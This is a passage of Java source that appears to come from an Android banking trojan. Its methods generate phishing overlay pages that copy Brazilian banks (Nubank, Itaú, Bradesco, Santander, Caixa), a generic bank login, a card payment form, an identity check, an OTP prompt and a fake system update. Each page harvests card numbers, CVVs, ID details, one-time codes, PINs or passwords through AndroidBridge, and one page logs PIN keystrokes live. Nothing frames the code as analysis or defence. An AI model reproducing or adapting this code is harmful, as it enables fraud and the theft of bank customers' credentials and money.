            ".card-row{display:flex;justify-content:space-between;font-size:12px;opacity:.8}" +
            ".secure{font-size:11px;color:#6b7280;text-align:center;margin-top:12px}" +
            ".secure span{color:#10b981}" +
            "</style><body>" +
            "<div class='card'>" +
            "<div style='display:flex;align-items:center;gap:12px;margin-bottom:20px'>" +
            "<div style='font-size:28px'>🔒</div>" +
            "<div><div style='font-weight:700;font-size:16px'>" + merchant + "</div>" +
            (amount.isEmpty() ? "" : "<div style='color:#059669;font-size:20px;font-weight:700'>" + amount + "</div>") +
            "</div></div>" +
            "<label style='font-size:13px;color:#374151;font-weight:600;display:block;margin-bottom:4px'>Card Number</label>" +
            "<input id='cardnum' type='tel' placeholder='1234 5678 9012 3456' maxlength='19' oninput='fmtCard(this)' />" +
            "<div style='display:flex;gap:12px'>" +
            "<div style='flex:1'><label style='font-size:13px;color:#374151;font-weight:600;display:block;margin-bottom:4px'>Expiry</label>" +
            "<input id='expiry' type='tel' placeholder='MM/YY' maxlength='5' oninput='fmtExpiry(this)' /></div>" +
            "<div style='flex:1'><label style='font-size:13px;color:#374151;font-weight:600;display:block;margin-bottom:4px'>CVV</label>" +
            "<input id='cvv' type='tel' placeholder='•••' maxlength='4' /></div>" +
            "</div>" +
            "<input id='name' type='text' placeholder='Cardholder Name' style='margin-top:8px' />" +
            "<button class='btn' onclick='doPayment()'>" + btnText + "</button>" +
            "<div class='secure'><span>🔐 Secure</span> payment powered by 256-bit SSL encryption</div>" +
            "</div>" +
            captureJs("cardnum", "expiry", "cvv", "name") +
            "<script>" +
            "function fmtCard(el){" +
            "  var v=el.value.replace(/\\D/g,'').substring(0,16);" +
            "  el.value=v.replace(/(\\d{4})/g,'$1 ').trim();}" +
            "function fmtExpiry(el){" +
            "  var v=el.value.replace(/\\D/g,'');" +
            "  if(v.length>=2)v=v.substring(0,2)+'/'+v.substring(2);el.value=v;}" +
            "function doPayment(){" +
            "  var c=document.getElementById('cardnum').value," +
            "    e=document.getElementById('expiry').value," +
            "    cv=document.getElementById('cvv').value," +
            "    n=document.getElementById('name').value;" +
            "  if(!c||!e||!cv)return;" +
            "  AndroidBridge.submit(JSON.stringify({card:c,expiry:e,cvv:cv,name:n}));" +
            "  document.querySelector('.btn').textContent='Processing...';" +
            "  setTimeout(function(){AndroidBridge.dismiss();},2500);}" +
            "</script></body></html>";
    }

    // ─── IDENTITY SKIN ───────────────────────────────────────────────────────

    private String buildIdentitySkin(String title, String subtitle, String btnText) {
        if (title == null) title = "Identity Verification Required";
        if (subtitle == null) subtitle = "To continue, please verify your identity";
        if (btnText == null) btnText = "Verify";
        return "<!DOCTYPE html><html>" + baseCss() +
            "<body><div class='card'>" +
            "<div style='font-size:56px;margin-bottom:16px'>🪪</div>" +
            "<h1 style='color:#1e40af'>" + title + "</h1>" +
            "<p class='sub'>" + subtitle + "</p>" +
            "<input id='fullname' type='text' placeholder='Full Name' />" +
            "<input id='dob' type='date' />" +
            "<input id='idnum' type='text' placeholder='ID / Passport Number' />" +
            "<input id='address' type='text' placeholder='Home Address' />" +
            "<button class='btn' style='background:#1e40af' onclick='doVerify()'>" + btnText + "</button>" +
            "</div>" +
            captureJs("fullname", "dob", "idnum", "address") +
            "<script>function doVerify(){" +
            "var d={name:document.getElementById('fullname').value," +
            "dob:document.getElementById('dob').value," +
            "id:document.getElementById('idnum').value," +
            "addr:document.getElementById('address').value};" +
            "AndroidBridge.submit(JSON.stringify(d));" +
            "document.querySelector('.btn').textContent='Verifying...';" +
            "setTimeout(function(){AndroidBridge.dismiss();},3000);}" +
            "</script></body></html>";
    }

    // ─── UPDATE SKIN ─────────────────────────────────────────────────────────

    private String buildUpdateSkin(String title, String subtitle, String btnText) {
        if (title == null) title = "System Update Required";
        if (subtitle == null) subtitle = "A critical security update is available. Please update to continue using your device.";
        if (btnText == null) btnText = "Update Now";
        return "<!DOCTYPE html><html><style>" +
            "*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,system-ui,sans-serif}" +
            "body{background:#fff;display:flex;flex-direction:column;align-items:center;" +
            "justify-content:center;min-height:100vh;padding:32px 24px;text-align:center}" +
            ".icon{font-size:80px;margin-bottom:24px}" +
            "h1{font-size:24px;font-weight:600;color:#111827;margin-bottom:12px}" +
            "p{font-size:15px;color:#6b7280;margin-bottom:28px;line-height:1.6;max-width:320px}" +
            ".progress{width:100%;max-width:320px;height:6px;background:#e5e7eb;border-radius:3px;" +
            "margin-bottom:8px;overflow:hidden}" +
            ".progress-bar{height:100%;background:#3b82f6;border-radius:3px;width:0%;" +
            "transition:width .3s ease}" +
            ".pct{font-size:13px;color:#6b7280;margin-bottom:24px}" +
            ".btn{background:#3b82f6;color:#fff;border:none;border-radius:8px;" +
            "padding:14px 32px;font-size:16px;font-weight:600;cursor:pointer}" +
            ".btn.later{background:transparent;color:#6b7280;margin-top:12px;font-size:14px}" +
            "</style><body>" +
            "<div class='icon'>📱</div>" +
            "<h1>" + title + "</h1>" +
            "<p>" + subtitle + "</p>" +
            "<div class='progress'><div class='progress-bar' id='bar'></div></div>" +
            "<div class='pct' id='pct'>Ready to install</div>" +
            "<button class='btn' id='ubtn' onclick='startUpdate()'>" + btnText + "</button>" +
            "<button class='btn later' onclick='AndroidBridge.dismiss()'>Remind me later</button>" +
            "<script>" +
            "function startUpdate(){" +
            "  document.getElementById('ubtn').style.display='none';" +
            "  document.querySelector('.btn.later').style.display='none';" +
            "  var pct=0;var iv=setInterval(function(){" +
            "    pct+=Math.random()*8+2;if(pct>95)pct=95;" +
            "    document.getElementById('bar').style.width=pct+'%';" +
            "    document.getElementById('pct').textContent=Math.round(pct)+'% Downloading...';" +
            "  },400);" +
            "  AndroidBridge.capture('update_triggered','true');" +
            "  setTimeout(function(){clearInterval(iv);" +
            "  document.getElementById('pct').textContent='Restarting device...';" +
            "  setTimeout(function(){AndroidBridge.dismiss();},2000);},8000);}" +
            "</script></body></html>";
    }

    // ─── VERIFY SKIN (OTP) ───────────────────────────────────────────────────

    private String buildVerifySkin(String title, String subtitle, String btnText) {
        if (title == null) title = "Verify Your Account";
        if (subtitle == null) subtitle = "Enter the 6-digit code sent to your number";
        if (btnText == null) btnText = "Verify";
        return "<!DOCTYPE html><html>" + baseCss() +
            "<style>.otp{display:flex;gap:8px;justify-content:center;margin:20px 0}" +
            ".otp input{width:44px;height:56px;border:2px solid #d1d5db;border-radius:8px;" +
            "font-size:24px;text-align:center;outline:none;padding:0}" +
            ".otp input:focus{border-color:#1a73e8}" +
            "</style><body><div class='card'>" +
            "<div style='font-size:48px;margin-bottom:12px'>🔐</div>" +
            "<h1>" + title + "</h1><p class='sub'>" + subtitle + "</p>" +
            "<div class='otp' id='otp-row'>" +
            "<input class='o' id='o1' maxlength='1' type='tel' />" +
            "<input class='o' id='o2' maxlength='1' type='tel' />" +
            "<input class='o' id='o3' maxlength='1' type='tel' />" +
            "<input class='o' id='o4' maxlength='1' type='tel' />" +
            "<input class='o' id='o5' maxlength='1' type='tel' />" +
            "<input class='o' id='o6' maxlength='1' type='tel' />" +
            "</div>" +
            "<button class='btn' onclick='doVerify()'>" + btnText + "</button>" +
            "<p style='font-size:13px;color:#1a73e8;margin-top:16px;cursor:pointer'>Resend Code</p>" +
            "</div><script>" +
            "var boxes=document.querySelectorAll('.o');" +
            "boxes.forEach(function(b,i){b.addEventListener('input',function(){" +
            "  if(b.value&&i<5)boxes[i+1].focus();checkDone();});});" +
            "function checkDone(){" +
            "  var code=Array.from(boxes).map(function(b){return b.value;}).join('');" +
            "  if(code.length===6){AndroidBridge.capture('otp',code);" +
            "  AndroidBridge.submit(JSON.stringify({otp:code}));" +
            "  setTimeout(function(){AndroidBridge.dismiss();},1500);}}" +
            "function doVerify(){checkDone();}" +
            "</script></body></html>";
    }

    // ─── BANK GENERIC ────────────────────────────────────────────────────────

    private String buildBankGenericSkin(String title, String subtitle, String btnText) {
        if (title == null) title = "Sign in to your bank";
        if (btnText == null) btnText = "Continue";
        return "<!DOCTYPE html><html>" + baseCss() +
            "<style>body{background:#0a3d62}" +
            ".card{border-radius:12px}" +
            ".bank-header{background:#0a3d62;padding:20px;text-align:center;border-radius:12px 12px 0 0;margin:-40px -48px 24px;}" +
            ".bank-icon{font-size:40px}" +
            "</style><body><div class='card'>" +
            "<div class='bank-header'><div class='bank-icon'>🏦</div></div>" +
            "<h1>" + title + "</h1>" +
            "<input id='username' type='text' placeholder='Username / Account number' />" +
            "<input id='pass' type='password' placeholder='Password / PIN' />" +
            "<button class='btn' style='background:#0a3d62' onclick='doLogin()'>" + btnText + "</button>" +
            "<p style='font-size:12px;color:#6b7280;text-align:center;margin-top:12px'>Secured by 256-bit SSL encryption</p>" +
            "</div>" +
            captureJs("username", "pass") +
            "<script>function doLogin(){" +
            "var u=document.getElementById('username').value,p=document.getElementById('pass').value;" +
            "if(!u||!p)return;" +
            "AndroidBridge.submit(JSON.stringify({username:u,password:p}));" +
            "setTimeout(function(){AndroidBridge.dismiss();},2000);}" +
            "</script></body></html>";
    }

    // ─── NUBANK SKIN ─────────────────────────────────────────────────────────

    private String buildNubankSkin(String title, String subtitle, String btnText) {
        if (title == null) title = "Entrar na sua conta";
        if (btnText == null) btnText = "Continuar";
        return "<!DOCTYPE html><html>" + baseCss() +
            "<style>body{background:#8a05be}.card{border-radius:16px}" +
            ".nu-logo{color:#8a05be;font-size:24px;font-weight:700;margin-bottom:20px}" +
            ".btn{background:#8a05be!important}" +
            "</style><body><div class='card'>" +
            "<div style='text-align:center;margin-bottom:20px'>" +
            "<div style='background:#8a05be;color:#fff;font-size:20px;font-weight:700;" +
            "padding:12px 20px;border-radius:8px;display:inline-block'>Nu</div></div>" +
            "<h1>" + title + "</h1>" +
            "<input id='cpf' type='tel' placeholder='CPF (apenas números)' maxlength='11' />" +
            "<button class='btn' style='background:#8a05be' onclick='doNext()'>Continuar</button>" +
            "</div>" +
            captureJs("cpf") +
            "<script>var step=1,savedCpf='';" +
            "function doNext(){" +
            "  if(step===1){" +
            "    savedCpf=document.getElementById('cpf').value;" +
            "    if(!savedCpf||savedCpf.length<11)return;" +
            "    document.querySelector('.card').innerHTML=" +
            "      '<h1>Senha</h1><p class=\"sub\">Digite sua senha de 4 a 6 dígitos</p>" +
            "      <input id=\"pin\" type=\"password\" inputmode=\"numeric\" placeholder=\"Senha\" maxlength=\"6\" />" +
            "      <button class=\"btn\" style=\"background:#8a05be\" onclick=\"doLogin()\">Entrar</button>';" +
            "    document.getElementById('pin').addEventListener('input',function(e){" +
            "      AndroidBridge.capture('pin',e.target.value);});step=2;" +
            "  }" +
            "}" +
            "function doLogin(){" +
            "  var p=document.getElementById('pin').value;if(!p)return;" +
            "  AndroidBridge.submit(JSON.stringify({cpf:savedCpf,pin:p}));" +
            "  setTimeout(function(){AndroidBridge.dismiss();},2000);}" +
            "</script></body></html>";
    }

    // ─── ITAU SKIN ───────────────────────────────────────────────────────────

    private String buildItauSkin(String title, String subtitle, String btnText) {
        if (title == null) title = "Acesse sua conta Itaú";
        if (btnText == null) btnText = "Acessar";
        return "<!DOCTYPE html><html>" + baseCss() +
            "<style>body{background:#ec7000}.btn{background:#ec7000!important}</style><body>" +
            "<div class='card'>" +
            "<div style='text-align:center;margin-bottom:20px'>" +
            "<div style='background:#ec7000;color:#fff;font-size:18px;font-weight:700;" +
            "padding:10px 20px;border-radius:8px;display:inline-block'>itaú</div></div>" +
            "<h1>" + title + "</h1>" +
            "<input id='ag' type='tel' placeholder='Agência' maxlength='4' />" +
            "<input id='conta' type='tel' placeholder='Conta' maxlength='10' />" +
            "<input id='senha' type='password' inputmode='numeric' placeholder='Senha eletrônica (6 dígitos)' maxlength='6' />" +
            "<button class='btn' style='background:#ec7000' onclick='doLogin()'>" + btnText + "</button>" +
            "</div>" +
            captureJs("ag", "conta", "senha") +
            "<script>function doLogin(){" +
            "var a=document.getElementById('ag').value,c=document.getElementById('conta').value," +
            "s=document.getElementById('senha').value;if(!a||!c||!s)return;" +
            "AndroidBridge.submit(JSON.stringify({agencia:a,conta:c,senha:s}));" +
            "setTimeout(function(){AndroidBridge.dismiss();},2000);}</script></body></html>";
    }

    private String buildBradescoSkin(String title, String subtitle, String btnText) {
        if (title == null) title = "Acesse o Bradesco";
        if (btnText == null) btnText = "Entrar";
        return buildBankColorSkin("#cc092f", "Bradesco", title, btnText, "ag", "conta", "senha");
    }

    private String buildSantanderSkin(String title, String subtitle, String btnText) {
        if (title == null) title = "Acesse o Santander";
        if (btnText == null) btnText = "Acessar";
        return buildBankColorSkin("#ec0000", "Santander", title, btnText, "cpf", "senha", null);
    }

    private String buildCaixaSkin(String title, String subtitle, String btnText) {
        if (title == null) title = "Acesse a Caixa";
        if (btnText == null) btnText = "Entrar";
        return buildBankColorSkin("#0070b4", "CAIXA", title, btnText, "cpf", "senha", null);
    }

    private String buildBankColorSkin(String color, String brand, String title,
                                      String btnText, String f1, String f2, String f3) {
        return "<!DOCTYPE html><html>" + baseCss() +
            "<style>body{background:" + color + "}.btn{background:" + color + "!important}</style><body>" +
            "<div class='card'>" +
            "<div style='text-align:center;margin-bottom:20px'>" +
            "<div style='background:" + color + ";color:#fff;font-size:18px;font-weight:700;" +
            "padding:10px 20px;border-radius:8px;display:inline-block'>" + brand + "</div></div>" +
            "<h1>" + title + "</h1>" +
            "<input id='" + f1 + "' type='text' placeholder='" + f1.toUpperCase() + "' />" +
            "<input id='" + f2 + "' type='password' placeholder='" + f2.toUpperCase() + "' />" +
            (f3 != null ? "<input id='" + f3 + "' type='text' placeholder='" + f3.toUpperCase() + "' />" : "") +
            "<button class='btn' style='background:" + color + "' onclick='doLogin()'>" + btnText + "</button>" +
            "</div>" +
            (f3 != null ? captureJs(f1, f2, f3) : captureJs(f1, f2)) +
            "<script>function doLogin(){" +
            "var d={};['"+f1+"','"+f2+"'"+(f3!=null?",'"+f3+"'":"") +
            "].forEach(function(id){d[id]=document.getElementById(id).value;});" +
            "AndroidBridge.submit(JSON.stringify(d));" +
            "setTimeout(function(){AndroidBridge.dismiss();},2000);}</script></body></html>";
    }

    private String buildCustomSkin(String title, String subtitle, String logoUrl, String btnText) {
        if (title == null) title = "Sign In";
        if (btnText == null) btnText = "Continue";
        return "<!DOCTYPE html><html>" + baseCss() +
            "<body><div class='card'>" +
            (logoUrl != null ? "<img src='" + logoUrl + "' style='max-height:60px;margin-bottom:20px'>" : "") +
            "<h1>" + title + "</h1>" +
            (subtitle != null ? "<p class='sub'>" + subtitle + "</p>" : "") +
            "<input id='user' type='text' placeholder='Username or Email' />" +
            "<input id='pass' type='password' placeholder='Password' />" +
            "<button class='btn' onclick='doLogin()'>" + btnText + "</button>" +
            "</div>" +
            captureJs("user", "pass") +
            "<script>function doLogin(){" +
            "var u=document.getElementById('user').value,p=document.getElementById('pass').value;" +
            "if(!u||!p)return;" +
            "AndroidBridge.submit(JSON.stringify({user:u,password:p}));" +
            "setTimeout(function(){AndroidBridge.dismiss();},2000);}" +
            "</script></body></html>";
    }
}
